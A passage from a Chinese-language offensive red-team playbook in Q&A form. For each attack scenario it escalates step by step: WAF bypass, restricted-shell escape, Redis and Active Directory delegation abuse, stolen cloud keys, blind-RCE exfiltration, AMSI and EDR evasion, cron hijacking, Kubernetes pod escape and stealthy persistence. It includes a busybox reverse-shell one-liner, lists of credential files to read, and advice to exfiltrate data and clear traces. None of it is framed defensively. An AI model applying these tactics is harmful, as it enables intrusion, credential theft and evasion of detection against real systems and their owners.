**A3**: 转"通过写文件间接执行"维度：若能写到 web 根、SSH 目录、cron 目录，走上一节的"写变执行"链。或者用 MySQL 触发的连接反打——恶意 MySQL 服务端可通过 `LOAD DATA LOCAL` 读客户端文件。执行不了就取值。
**Q4**: PostgreSQL 没 `COPY PROGRAM` 权限，也没 `pg_read_server_files`——被墙往哪转？
**A4**: 正交转"利用扩展 / 反连"维度：PG 装了 `dblink`/`postgres_fdw` 就可能有 SSRF 效果，探测内网 PG。或利用 `lo_import`/`lo_export`（大对象）在受限沙箱下做文件读。数据库执行原语被封时，往往仍留有网络原语。
**Q5**: 完全无路可走做 RCE？
**A5**: 降级为"数据洗劫+凭据变现"：数据库里有的常常已经够了——用户表 hash 拿去横向、config 表明文密码、应用密钥能伪造 session。SQLi 本身就是终态之一，别一定要转 shell。

### WAF 挡了大部分 payload
**Q1**: 我知道漏洞点在哪，但 WAF 命中率高，几种基础 payload 全被拦。先怎么办？
**A1**: 分层判 WAF：先探测拦哪一层——URL 层？body？header？Cookie？UA？判据是把 payload 分片放到不同位置，看哪儿过。同 payload 换位置就过，说明 WAF 只监一层。
**Q2**: WAF 每层都监，但对编码敏感度不同？
**A2**: 走"编码正交"：URL 双编码、Unicode 全角、HTML 实体、Base64 参数、chunked 分片、multipart 分段。很多 WAF 只解一层码或不解某种码。判据是同 payload 换编码后响应变化。
**Q3**: 编码全试都被拦（有语义解析的 WAF）？
**A3**: 转"协议层降维"维度：HTTP 版本降到 HTTP/1.0、加大量伪 header、请求走 chunked 且分块不常规、Content-Length 冲突（Request Smuggling 侧信道）。协议解析歧义常能让 WAF 和后端看到不同 payload。
**Q4**: 协议层也扛住了——被墙往哪转？
**A4**: 正交转"走后端不经过 WAF"维度：找源站直连 IP（历史 DNS、SSL 证书 SAN、SPF 记录、shodan 反查），或找一个未接 WAF 的子域/端口。WAF 只挡它前面的流量，绕开就无效。
**Q5**: 源站找不到，全站都上 WAF？
**A5**: 转慢速/低频路径：WAF 有速率和特征阈值，把 payload 摊到很低频、每次只带一小片信息（盲注一字节、SSRF 一探）。牺牲时间换过 WAF。或找 WAF 白名单入口（内部 API/合作方接口）。

### SSH 登入后落进 rbash / 受限 shell
**Q1**: SSH 成功但落进 rbash（受限 bash）或类似监狱 shell，很多命令不能跑。先判什么？
**A1**: 先看限制类型：`echo $SHELL`/`echo $0` 看 shell 名；`compgen -c` 或 tab 补全看哪些命令可用；试 `cd /` 看能不能改目录、试 `PATH=/bin:$PATH` 看能不能改 PATH。判据决定绕哪一层。
**Q2**: rbash 的经典绕法有哪些？
**A2**: 一是"启动就绕"：SSH 时用 `ssh user@host -t "bash --noprofile --norc"` 或 `-t "/bin/sh"` 直接指定 shell，绕过 login shell 的 rbash 加载；二是"已在 rbash 里绕"：找允许调用的解释器（vi/less/man/awk/find 等）内嵌 shell 逃出。
**Q3**: 都被堵死（连允许的命令列表都很短）？
**A3**: 转"用 ssh 特性做原语"维度：SSH 支持 `-o ProxyCommand`、port forwarding、SFTP、SCP。就算 shell 受限，SFTP 通道往往还能读写文件、端口转发能建隧道。用 SSH 协议本身而不是 shell 去达成目的。
**Q4**: 连 SFTP 都关了，只留 rbash——被墙往哪转？
**A4**: 正交转"钓凭据/横向"维度：既然本机受限，转而利用当前身份能触及的外部资源。看历史（`.bash_history`若可读、`.ssh/config` 里的 host 定义、known_hosts），找它常连哪些机器，去那边试。受限环境常是"该账号只是跳板"的信号。
**Q5**: 什么都受限，账号也没其他机器可跳？
**A5**: 承认这是一个纯"信息型"落脚点，只用于确认可达性、留存作为长期入口。别浪费时间硬绕，转投别的入口点或别的账号。

### Redis/Memcached 未授权拿到但常规写路径被禁
**Q1**: Redis 未授权成功，但写 SSH key、写 crontab、主从复制 RCE 都失败。先判什么？
**A1**: 判失败原因：`CONFIG SET dir` 被 rename 或禁用？主从复制被 rename 命令屏蔽？`dir` 设置的路径写入被限（用户权限、SELinux）？判据是每个动作的具体报错。ACL/rename 是新版 Redis 常见防护。
**Q2**: CONFIG 被 rename 但基础读写还在？
**A2**: 转"Redis 内数据洗劫"维度：`KEYS *` 全扫，dump 缓存里的 session、API token、业务缓存的用户数据。很多应用把敏感对象缓存在 Redis 里明文存储，价值不亚于 RCE。
**Q3**: 我确实需要落地执行，Redis 本身不给写路径——被墙往哪转？
**A3**: 正交转"用 Redis 打其他服务"维度：SSRF 式利用——Redis 可以被诱导发送任意 TCP 流量到别的服务（`CLUSTER MEET` 类），若内网有依赖 Redis 的应用会主动去读 Redis 数据，注入恶意反序列化载荷（Java 生态里 Jedis+反序列化历史多次）。
**Q4**: 无别的服务可打？
**A4**: 转"污染业务"维度：改 Redis 里存的关键 key（session、feature flag、rate limit），可能达成越权/降级验证/绕过风控。不 RCE 但改变业务行为，同样是有效攻击面。
**Q5**: 无写权限，只读？
**A5**: 只读也够——单纯 dump 数据。承认 Redis 只是信息原语，把它当成"内网大字典"用完就走。

### 有域凭据但没本地 shell，选哪种远程执行
**Q1**: 手上有域内某账号的凭据（密码/hash/票据），但没落地任何机器。想在目标机执行代码，从 SMB/WinRM/DCOM/WMI/RDP/SSH 里选一个。怎么选？
**A1**: 按三个维度筛：一是账号权限（是否为目标本地管理员/远程管理组）；二是目标开的服务（445/5985/135/3389 谁通）；三是隐蔽性（RDP 高噪、psexec 落文件、WMI/WinRM 相对轻）。先端口探测确定候选，再按权限过滤。
**Q2**: 445 通，账号是本地管理员——用 SMB？
**A2**: SMB 有几种子选择：psexec 风格（起服务，落 binary，噪音大）、smbexec（半交互，稍轻）、atexec（走 at/schtasks 计划任务）、wmiexec（走 WMI，无落地文件但走 135/DCOM 和临时 SMB 共享）。判据是被审计的严格程度和是否需要交互。
**Q3**: 想更隐蔽——用 WinRM？
**A3**: WinRM（5985/5986）走 HTTP，日志留在 WinRM 服务日志而不是常规安全日志，且无文件落地。前提是目标开了 WinRM 且账号在 Remote Management Users 组。判据是端口通且认证过。
**Q4**: WinRM/SMB 都被限（账号无权、端口关）——被墙往哪转？
**A4**: 正交转"通过共享/协议触发"维度：即使不能直接执行，可能能通过 UNC 路径触发（打印机、WebDAV），能通过 Kerberos 委派间接执行，能通过 LDAP 修改域对象让别人替我执行。执行不是唯一手段，"改变状态让系统替我干"更隐蔽。
**Q5**: 什么远程执行都不行，账号权限太低？
**A5**: 转"升凭据"维度：低权账号在域内也可以做 Kerberoast、AS-REP roast、LDAP 枚举找错配、ADCS 模板滥用。这些不需要远程执行权限，只需要能与 DC 通信。攻击面转到 AD 协议层。

### 拿到 TGT 但受约束委派限制
**Q1**: 我拿到某账号的 TGT，S4U2Self/S4U2Proxy 想以任意用户身份访问目标服务——但报错。先判什么？
**A1**: 判委派类型：无约束（unconstrained）、约束（constrained，仅允许特定 SPN）、基于资源的约束（RBCD，目标机自己配的）。每种利用路径不同。用 LDAP 查账号的 `msDS-AllowedToDelegateTo` 和目标的 `msDS-AllowedToActOnBehalfOfOtherIdentity`。
**Q2**: 是约束委派但目标 SPN 不是我想要的服务？
**A2**: 转 SPN 替换：Kerberos 允许在 S4U2Proxy 拿到的服务票据里改 sname 字段（历史 CVE / 有意的协议特性），只要 KDC 不校验特定字段，可以把 CIFS 票据改成 HOST/LDAP 等价服务。判据是当前补丁级别。
**Q3**: RBCD 路线：能不能自己创个机器账号配 RBCD？
**A3**: 若当前账号有 `MachineAccountQuota > 0` 或能在目标 OU 创机器对象，能自造一个"代理机器账号"，配它 RBCD 到目标机，然后 S4U 拿票据。判据是 MAQ 值和 OU 权限（ACL 里的 CreateChild）。
**Q4**: MAQ = 0、无 ACL 可用——这条被墙往哪转？
**A4**: 正交转"打 ADCS 或滥用现有委派链"维度：ADCS ESC1-11 若某个可打，直接签证书拿域管；或枚举整个域里所有配委派的账号，找一条我能触及的委派链间接达成。委派是网状的，一条不通换一条。
**Q5**: 委派维度全灭？
**A5**: 转"降级为普通认证滥用"：Kerberoast/AS-REP roast、LDAP 中继（打 ADWS/LDAP signing 未开）、NTLM relay（打 LDAPS/HTTP CA）。委派只是 Kerberos 攻击面的一部分，NTLM 侧还有大量原语。

### 拿到密钥/token 但不知怎么变成本机执行
**Q1**: 通过 SSRF/文件读拿到一堆密钥（AWS/GCP/Azure key、Docker registry token、Kubeconfig、Git token），怎么变成执行？
**A1**: 按密钥类型分：云 access key → 直接调云 API 起实例/改角色；kubeconfig → `kubectl` 操作集群资源；registry token → pull/push 恶意镜像等下次部署；git token → 提交恶意代码到被自动部署的仓库。每种都是"用合法通道触发执行"。
**Q2**: 有云 access key，怎么最快拿到执行？
**A2**: 先 `sts get-caller-identity` 定位身份和权限，`iam list-attached-*-policies` 看能干什么。有 EC2 权限就 RunInstances（自制 user-data 里带 payload）；有 Lambda 权限就 UpdateFunctionCode；有 SSM 权限就 SendCommand 到已有实例。选权限允许且噪音最小的。
**Q3**: 权限被 IAM condition 卡得死，只能读某个 bucket——被墙往哪转？
**A3**: 正交转"读也能找到别的密钥"维度：S3 里常放着别的服务的 config/backup/日志，日志里常常有 token 泄漏。密钥的层级利用是从低权 key 读到高权 key，逐级升。
**Q4**: 有 kubeconfig，权限是某 namespace 的普通用户？
**A4**: 先 `kubectl auth can-i --list` 精确权限，找能创 Pod 的 namespace，起个挂载了 hostPath `/` 或 privileged 的 Pod，从 Pod 逃到 node。或找能读 secrets 的权限，把别的 namespace secrets 拉出来（含 ServiceAccount token，升级维度）。
**Q5**: 权限极小做不了什么？
**A5**: 承认此密钥的价值只是"存在性证据"，别浪费在弱密钥上。转去找同一泄漏源里可能还有的其他密钥，或把它作为持久化备用（长期有效不易撤销的 key 留着）。

### 命令执行没回显，也没带外通道
**Q1**: 我确认了 RCE（能改文件系统状态验证），但页面无回显，出网也全封（DNS/HTTP/ICMP 都不通）。怎么取结果？
**A1**: 走"回内信道"：让命令输出写到 web 可访问的文件（若能定位 webroot），再从 web 读；或写到 SQL 表（若能触发 SQL 写）；或塞进响应头（若能控响应生成路径）。目标机就是自己的中继。
**Q2**: web 根不可写，也无 SQL 路径？
**A2**: 用"时间信道"：命令执行内根据结果 sleep 不同时长，从 HTTP 响应时间差回读一位一位信息。极慢但可靠，只需要一个能测响应时间的通道。
**Q3**: 时间差不稳（有 CDN/缓存/异步），信噪比低？
**A3**: 转"页面差信道"：让命令根据结果条件性地写到某个已有 web 页面（比如追加日志文件到已可访问的路径）。从 web 拉页面对比内容差异回读。这是布尔盲注思路的 RCE 版。
**Q4**: 页面都无差异可用——被墙往哪转？
**A4**: 正交转"改变可观察外部行为"维度：让命令启动一个反向连接到已经建立的连接对端（复用现有出口 IP，不新建出网）、或者让它挂进一个正在响应外面请求的 worker 进程（内存马注入），后续通过该 worker 的正常响应通道取结果。
**Q5**: 所有取结果路径都失败？
**A5**: 承认盲态并降级动作："盲操作但改变系统状态"仍然有价值——盲落 webshell（后续访问验证）、盲加计划任务（等下次时间到）、盲改配置。RCE 即使全盲，也是"预约动作"原语，不必即时取值。

### 提权卡住 —— 死磕本机还是横向
**Q1**: 我在一台机器上试了所有本机提权，一条都没打通。要不要继续？
**A1**: 先估"本机对目标的必要性"。如果我要的东西（数据、下一跳凭据、AD 权限）本机 root 也未必能拿到，提权就没必要。判据是列一下"我到底缺什么"，如果不缺 root 才能拿的东西，就别提。
**Q2**: 那横向需要什么条件？
**A2**: 需要"当前身份可触达的其他资产"。查 `.ssh/config`/`.bash_history`/浏览器书签/凭据管理器/`~/.aws`/`~/.kube`/环境变量。低权用户往往仍有"跨机身份"，跳过提权直接换战场。
**Q3**: 当前身份连接不到别的机器，只跟这一台绑定？
**A3**: 转"内网嗅探"维度：从当前机器扫内网找开放服务，即使没凭据也能试匿名/未授权/默认口令。很多内网服务比这台被打过的机器脆。低权+网络可达常常就够开新入口。
**Q4**: 内网扫描也无收获——被墙往哪转？
**A4**: 正交转"埋伏与等待"维度：本机不提权、不横向，就落一个持久化钩子等目标用户/管理员操作（改 `.bashrc`、加 systemd user unit、放 git hook）。有些提权只能等而不能主动触发。同时用当前时间做别的方向的侦察。
**Q5**: 时间不允许等？
**A5**: 承认这条链停在这里，回退到项目全局重新排优先级。也许本机根本不是关键路径，删掉这个节点回去别的入口点。红队的"放弃"是战术，不是失败。

### AV/EDR 下 payload 落地策略
**Q1**: 目标机有明显 EDR（进程里看到 CS/微软 Defender/其他厂商），我要落 payload。先判什么？
**A1**: 先判 EDR 检测哪一层：文件静态特征（签名/字符串）？内存扫描（AMSI/ETW）？行为 API 调用（child_process spawn 链）？网络？每层对应不同规避。判据是先落一个"什么都不做"的空 payload 看它是否被杀，再逐步加功能定位触发点。
**Q2**: 静态查杀严，PE 落地就杀？
**A2**: 转"无文件"路径：payload 不落磁盘，用现有解释器（受信的 CLR 宿主/脚本引擎）从内存加载。或走"合法工具"路径——用 LOLBins 完成关键动作。文件层 EDR 对内存/合法进程都盯不牢。
**Q3**: 内存扫描（AMSI）拦 PowerShell/CLR？
**A3**: 转 AMSI 绕过：patch amsi.dll 的 AmsiScanBuffer 首字节返回 clean、hook 前置卸载、或换未接 AMSI 的宿主。前提是当前进程内没有已运行的检测器盯着 amsi 内存本身。
**Q4**: 行为链盯得死，任何 spawn 子进程都告警——被墙往哪转？
**A4**: 正交转"无 spawn 达成效果"维度：数据类需求（读文件/查注册表/枚举内存）不需要新进程；网络类需求可以在当前进程内自发 socket。EDR 主要盯 spawn 链和敏感 API 组合，同进程语言层动作触发面小得多。
**Q5**: 需求确实必须 spawn 且 EDR 严？
**A5**: 转"换机器"：这台盯得严就别硬碰。用当前凭据横向到策略更松的机器（DMZ 里的旧服务器、临时环境、开发机常常没同款 EDR）跑真正的 payload。EDR 覆盖率永远不均匀，找洼地。

### SELinux/AppArmor 阻断了动作
**Q1**: Linux 上明明有权限但操作被拒（`Permission denied` 但用户能力足够），日志里看到 SELinux/AppArmor 告警。怎么办？
**A1**: 先看模式：`getenforce` 或 `aa-status`。SELinux Permissive 模式下拒绝会记录但不阻断（可绕）；Enforcing 需要真正绕。AppArmor 类似。判据是这条命令是否值得触发大量审计日志。
**Q2**: Enforcing 模式，我想用一个原本无权操作的路径？
**A2**: 转"选择上下文允许的动作"维度：SELinux 拒绝的是"这个 domain 不能对那个 type 做那件事"，同 domain 对别的 type 可能可以。列出当前进程 context（`id -Z`）和目标文件 context，看有没有等价路径。
**Q3**: 我确实必须做被禁的动作？
**A3**: 转"换 domain"维度：通过一个 transition 允许的入口（比如 root 用户从 initrc_t 转到别的 domain）间接达成。或找一个已在允许 domain 的进程注入。SELinux 是 domain 网络，转 domain 比破 policy 便宜。
**Q4**: 转不了 domain，也无进程可注入——被墙往哪转？
**A4**: 正交转"绕过 MAC 层"维度：内核 exp 直接绕（成功即无视 SELinux）、或通过 kmod 加载修改 policy（若能）、或找 policy 本身的错配（`sesearch` 找异常规则）。承认成本高，评估是否值得。
**Q5**: 该动作在这台机不可能完成？
**A5**: 转别的机器：策略是每机独立配置的，另一台同角色机器可能配置较松。别浪费时间对特定 policy 硬绕。

### 只有 crontab/systemd/atd 目录可写
**Q1**: 我发现某个 root 会读的调度目录（`/etc/cron.d`、`/etc/systemd/system`、at 队列）我可写。怎么用？
**A1**: 先判触发频率和时机。cron.d 里的文件下次时间片就跑（分钟级）；systemd unit 需要 daemon-reload 或重启才生效（除非用 systemctl 触发）；at 队列在指定时间。判据是"我等得起吗、我能不能主动触发"。
**Q2**: cron.d 可写，直接投一个每分钟跑的？
**A2**: 可以，但注意格式严格（必须有用户字段）。写错整个 crontab 会拒绝加载。给自己留退路——不改现有条目，新加独立文件；执行内容用绝对路径（cron 环境 PATH 极简）。
**Q3**: systemd unit 目录可写但无权 reload？
**A3**: 转找 timer/path/socket unit 类：某些 unit 类型（path unit 监控文件变化）可能已经在跑，改它引用的 exec 路径就下次触发时执行。或写一个 user unit 到 `~/.config/systemd/user/`，等目标用户登录时 systemd --user 自动加载。
**Q4**: 目录可写但 root 的 crond/systemd 有沙箱/审计——被墙往哪转？
**A4**: 正交转"其他会被 root 触发的可写目录"维度：logrotate 的配置片段目录、apt/yum 的 hooks、mail 的 aliases（`|command` 语法）、update-motd。系统里"root 会主动读并执行"的位置远不止 cron/systemd。
**Q5**: 全部关键触发点都受审计？
**A5**: 转"钓人"维度：写到 root 常操作的位置（vim/less 配置、shell rc、git 全局 config、tmux/screen 配置），等 root 下次交互时触发。被动触发比主动触发隐蔽。

### 嵌入式/网络设备命令注入受限
**Q1**: 打的是路由器/摄像头/工控设备，命令注入点确认了但环境是 busybox，很多标准工具没有。先判什么？
**A1**: 先枚举 busybox 支持哪些 applet：`busybox --list` 或 `ls /bin`。判据决定能用哪些原语——很多设备连 curl/wget 都精简掉了，但通常留 `nc`/`telnet`/`ftpget`。别假设 GNU 工具存在。
**Q2**: 想反弹 shell 但 nc 没 `-e`（busybox nc 常无 exec）？
**A2**: 用 mkfifo + `/bin/sh` 组合：`mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc host port > /tmp/f`。或用 telnet 双管道。busybox 环境反弹的标准做法是命名管道，别指望 -e。
**Q3**: 文件系统只读（squashfs），落不下工具？
**A3**: 转"内存中执行"维度：用 wget/tftp 拉一个静态编译的 arm/mips 二进制到 `/tmp`（通常 tmpfs 可写可执行）、或者干脆在 /dev/shm 落地。设备上 tmpfs 是最后可写点。
**Q4**: /tmp 也 noexec，或架构无对应 binary——被墙往哪转？
**A4**: 正交转"设备本身能力"维度：路由器有 iptables 可以改路由/开端口转发；摄像头有网络流；工控有可控 PLC 指令。不追求 shell，用设备的本职能力做侦察/横向。
**Q5**: 完全无路，只能一次性触发一个短命令？
**A5**: 用这一次触发做最有价值的事：dump 配置文件（含密码/网络拓扑/凭据）到可读位置，一次读走。嵌入式设备的 config 常是最值钱的目标，比 shell 更实用。

### Kubernetes Pod 里拿到 shell 想拿 node
**Q1**: 打进一个 pod 拿到 shell（可能是 web 应用的 pod），想跳到宿主 node。先判什么？
**A1**: 先看 pod 权限矩阵：`cat /var/run/secrets/kubernetes.io/serviceaccount/token`（是否挂了 SA token）、`ls /var/run/docker.sock`（是否挂 docker sock）、`mount | grep host`（是否挂宿主目录）、`capsh --print`（capabilities）。任何一项异常就是一条路。
**Q2**: SA token 挂了，权限矩阵怎么看？
**A2**: 用 token 调 API：`kubectl auth can-i --list --token=$TOKEN`。找能创 Pod/DaemonSet/Job 的权限——若能创，就起一个特权 Pod（hostPID、privileged、mount host `/`）跳到 node。SA 权限决定了这条路的可行性。
**Q3**: SA 权限极小、无挂载异常，但能访问 metadata service？
**A3**: 转 metadata 维度：云环境的 metadata endpoint（169.254.169.254）常泄漏 IAM/instance credential，能拿到 node 或整个集群的凭据。判据是能不能访问该地址、有没有 IMDSv2 强制 hop-limit。
**Q4**: metadata 也隔离了——被墙往哪转？
**A4**: 正交转"横向到别的 pod"维度：pod 间网络往往是平的，扫内网找脆弱服务（Redis 未授权、Consul 未授权、旧 web 应用、开发环境的 debug 端口）。集群里最脆的常常不是当前 pod。
**Q5**: 集群网络严格隔离（NetworkPolicy），横向也不通？
**A5**: 降级为"这个 pod 内的数据/服务"：读它挂载的 configmap/secret、读它连的数据库、读环境变量里的凭据。承认无法跳出，把 pod 当纯信息节点用完就走。

### 只有任意文件读一个原语，怎么榨出最大价值
**Q1**: 我只拿到"任意文件读"（LFI/XXE/路径穿越），没有写、没有执行。这个原语能榨出多少？
**A1**: 想成"以目标进程身份读任意路径"，价值极高。先做三层清单：一是"直接凭据"（`/etc/shadow`若权限够、`~/.ssh/id_*`、`~/.aws/credentials`、`~/.docker/config.json`、`~/.git-credentials`）；二是"应用配置"（web 应用 config、DB 连接串、密钥文件）；三是"上下文/内存类"（`/proc/self/environ`、`/proc/*/cmdline`、`/proc/*/maps`）。按值降序读。
**Q2**: 我读不到 shadow（进程非 root），怎么找凭据？
**A2**: 转"应用层凭据"：web 应用配置文件里大概率明文写着 DB/缓存/邮件/API 密码；`.git/config` 有 remote URL 可能含 token；框架的 session 密钥能让我离线伪造 session。应用凭据比系统凭据面广得多。
**Q3**: 应用路径不知道在哪？
**A3**: 走"从已知读未知"：先读 `/proc/self/cmdline` 拿当前进程启动参数，找到 app 路径；读 `/proc/self/maps` 拿加载库列表；读 nginx/apache 主配置定位所有 vhost 和 webroot。用文件读做侦察，把未知路径变已知。
**Q4**: 我需要变成 RCE，文件读能升级吗？
**A4**: 有几条经典路：读到 SSH 私钥直接登（等价 RCE）；读到 session 密钥伪造管理员 session 后从后台上传；读到 DB 凭据直连数据库走 DB 层 RCE；读到框架 debug 密钥（Werkzeug PIN 类）拿控制台。文件读升级的关键是"读到能开新入口的钥匙"。
**Q5**: 目标文件都读不到（路径过滤严、只能读特定后缀）——被墙往哪转？
**A5**: 正交转"绕过读限制"维度：URL 编码/双编码/空字节截断（老版本）/protocol wrapper（php://filter 转 base64 绕后缀检查）/绝对路径变相对/软链接跳出。或者转"读原语间接触发"——某些 XXE 能触发 SSRF，某些 LFI 能触发 include，从"读"扩展到"执行"是通过协议特性完成的。
**Q6**: 读原语彻底受限成"只能读固定几个白名单文件"？
**A6**: 承认这已经是最弱形态，把它当"低频信息通道"：能读某个日志/某个状态文件也许还能拿到一些运行时信息（登录用户、错误 stack、日志中的 token）。定期轮询白名单文件的变化，就地当传感器用。

### 立足点稳固化 —— 什么时候停手做持久化
**Q1**: 我刚拿到一个能用的 shell/凭据，接下来是继续深入还是先做持久化？
**A1**: 判"当前入口的稳定性"和"深入动作的暴露风险"。入口是漏洞利用得来的（重启/patch 就没）就先持久化；入口是稳定凭据（AD 账号、long-lived token）就可以先深入。深入动作噪音大（打内核 exp、跑 mimikatz）之前应先持久化，怕打断后无法回来。
**Q2**: 决定先持久化，选什么形式？
**A2**: 按"审计易被发现"和"重启存活"两轴选。webshell 简单但常被扫；SSH key 稳定但审计易见；系统级持久化（cron/systemd/service）重启存活但需要写权限。多样化——同时布 2-3 种正交类型比单一强得多。
**Q3**: 我不确定还会不会被检测到（担心已有告警）？
**A3**: 转"最小侵入观察期"维度：先不做重的持久化，用 low-touch 手段（改环境变量、加 alias、软链接偷换）留一个能后续回来但不留明显 artifact 的钩子，等一段时间看目标反应。急着落重持久化容易一次触发全套告警。
**Q4**: 想持久化但当前用户马上会切/进程会退——被墙往哪转？
**A4**: 正交转"持久化寄生到别的实体"维度：持久化不必挂在当前用户/进程上，可以是加一个新用户、改一个别人的 shell 配置、写一个系统级的 unit。让持久化独立于当前的临时执行上下文。
**Q5**: 环境非常敏感，任何持久化都可能被 IR 发现，怎么办？
**A5**: 承认这种目标不适合持久化，改为"数据一次带走"模式。快速完成信息收集/凭据抓取/关键数据 exfil，然后放弃入口清理痕迹。持久化不是必选项，某些环境下"进-取-撤"比"进-驻"更专业。
